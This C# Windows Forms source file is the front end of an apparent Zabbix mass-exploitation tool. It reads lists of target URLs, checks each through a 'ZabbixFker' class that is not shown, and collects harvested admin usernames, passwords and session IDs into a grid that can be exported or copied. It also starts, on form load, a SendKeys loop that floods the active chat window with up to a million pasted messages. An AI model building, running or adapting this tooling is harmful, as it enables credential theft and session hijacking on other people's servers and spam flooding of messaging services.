using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MetroFramework.Controls;
using MetroFramework.Forms;

namespace ZabbixExp
{
    public partial class MainFrm : MetroForm
    {
        public MainFrm()
        {
            InitializeComponent();
            
                Grid.MouseClick += (o, e) =>
            {
                if (e.Button == MouseButtons.Right)
                {
                    var m = new ContextMenu();
                    var m1 = new MenuItem("input(入)");
                    m1.Click += (oooo, eeee) =>
                    {
                        input();
                    };
                    var m2 = new MenuItem("output(出)");
                    m2.Click += (oooo, eeee) =>
                    {
                        ThreadPool.QueueUserWorkItem(s =>
                        {
                            var filename = DateTime.Now.ToFileTime().ToString() + ".txt";
                            StreamWriter sW = new StreamWriter(DateTime.Now.ToFileTime().ToString() + ".txt");

                            for (int row = 0; row < Grid.Rows.Count -1; row++)
                            {
                                string lines = row.ToString() + ".";
                                for (int col = 0; col < 4; col++)
                                {
                                    lines += (string.IsNullOrEmpty(lines) ? " " : ", ") + Grid.Rows[row].Cells[col].Value.ToString();
                                }
                                sW.WriteLine(lines);
                            }
                            sW.Close();
                            Process.Start(Application.StartupPath +"/" + filename);
                        });
                    };
                    var m3 = new MenuItem("Copy(複製)");
                    m3.Click += (oooo, eeee) =>
                    {
                        int currentMouseOverRow = Grid.HitTest(e.X, e.Y).RowIndex;

                        if (currentMouseOverRow >= 0)
                        {
                            Clipboard.SetText(Grid.Rows[currentMouseOverRow].Cells[0].Value+ ":" + Grid.Rows[currentMouseOverRow].Cells[4].Value);
                        }
                    };
                        m.MenuItems.Add(m1);
                    m.MenuItems.Add(m2);
                    m.MenuItems.Add(m3);
                    m.MenuItems.Add(new MenuItem("http://www.xssec.org(新世紀安全)"));
                    m.Show(Grid, new Point(e.X, e.Y));
                }
            };
            Control.CheckForIllegalCrossThreadCalls = false;
        }

        private CookieContainer cc = new CookieContainer();

        private void input()
        {
            this.BeginInvoke(new Action(() =>
            {
                Stream myStream = null;
                OpenFileDialog theDialog = new OpenFileDialog();
                theDialog.Title = "Open Text File";
                theDialog.Filter = "TXT files|*.txt";
                theDialog.InitialDirectory = Application.StartupPath;
                if (theDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        string filename = theDialog.FileName;
                         List<string> list = File.ReadAllLines(filename).ToList();
                        list.ForEach(x =>
                        {
                            Grid.Rows.Add(x,"","","","");
                        });
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Error: Could not read file from disk. Original error: " + ex.Message);
                    }
                }
            }));
        }
        private void StartBtn_Click(object sender, EventArgs e)
        {
            StartBtn.Enabled = false;
            if (Grid.Rows.Count == 0) return;
            try
            {
                var core = new ZabbixFker();
                foreach (DataGridViewRow row in Grid.Rows)
                {
                    ThreadPool.QueueUserWorkItem(b =>
                    {
                        var url = "";
                        var able = false;
                        var userPw = "";
                        var session = "";
                        Uri uriResult;
                       
                        url = row.Cells[0].Value.ToString();
                     
                        if (!url.Contains("http://")) url = "http://" + url;
                        bool result = Uri.TryCreate(url, UriKind.Absolute, out uriResult)
                        && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
                        if (result)
                        {
                            row.Cells[1].Value = "checking檢查中";
                            able = core.ExistExp(url, cc);
                            if (able)
                            {
                                ThreadPool.QueueUserWorkItem(q =>
                                {
                                    userPw = core.getUserNamePassword(url, cc);
                                    session = core.getSession(url, cc);
                                    this.BeginInvoke(new Action(() =>
                                    {
                                        row.Cells[1].Value = "true(可)";
                                        row.Cells[2].Value = userPw.Split(':')[0] ?? "";
                                        row.Cells[3].Value = userPw.Split(':')[1] ?? "";
                                        row.Cells[4].Value = session;
                                    }));
                                });
                            }
                            else
                            {
                                this.BeginInvoke(new Action(() => {
                                                                      row.Cells[1].Value = "false(不可)";
                                }));
                            }
                        }
                    });

                }
            }
            catch { }
            GC.Collect();
            StartBtn.Enabled = true;
        }

        public void doCount()
        {
            Thread.Sleep(500);
            for (int i = 999999; i >= 0; i--)
            {
                Clipboard.SetText("如果一秒一個msg唔會被blcok ~ \n 咁要幾多個先會block ?\n 咁我吔一齊試下la \n 依加第  " +i.ToString() +" 個msg");
                Thread.Sleep(1000);
                SendKeys.SendWait("^v");
                SendKeys.SendWait("{ENTER}");

            }
        }
        private void MainFrm_Load(object sender, EventArgs e)
        {
            ThreadPool.SetMinThreads(10, 10);
            ThreadPool.SetMaxThreads(30, 30);
           doCount();
        }
    }
}
